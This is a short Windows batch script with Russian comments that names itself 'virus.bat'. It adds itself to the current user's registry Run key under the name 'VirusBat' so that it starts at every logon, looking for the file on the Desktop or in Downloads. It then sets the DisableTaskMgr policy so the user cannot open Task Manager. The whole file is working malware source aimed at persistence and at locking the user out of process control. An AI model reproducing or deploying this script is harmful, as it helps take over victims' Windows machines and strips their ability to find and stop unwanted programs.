:: (Скрывает вывод комманд в консоль/терминал, чтобы пользователь ничего не увидел)
@echo off

echo ====================
echo      Загрузка...
echo ====================


:: (Проверка существования автозапуска в реестре)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" >nul 2>&1
echo Проверка автозапуска в реестре Windows...

:: (Проверка ошибок, и когда автозапуск отсутствует он добавлятся)
if %errorlevel% == 0 (
    echo автозапуск существует. Переход к другим частям кода.
    goto :end
) else (
    :: (Переменные)
    set "filename=virus.bat"
    set "desktop=%USERPROFILE%\Desktop"
    set "downloads=%USERPROFILE%\Downloads"
    echo Переменные загружены

    :: (Проверяем рабочий стол)
    if exist "%desktop%\%filename%" (
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%desktop%\%filename%" /f
        echo Файл найден и добавлен в реестр.
        goto :end
    )

    :: (Проверяем загрузки)
    if exist "%downloads%\%filename%" (
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
        echo Файл найден и добавлен в реестр
    ) else (
        echo Файл не найден.
    )
)

:end

:: (Запрет открытия диспетчера задач)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
echo Диспетчер задач запрещён к запуску.
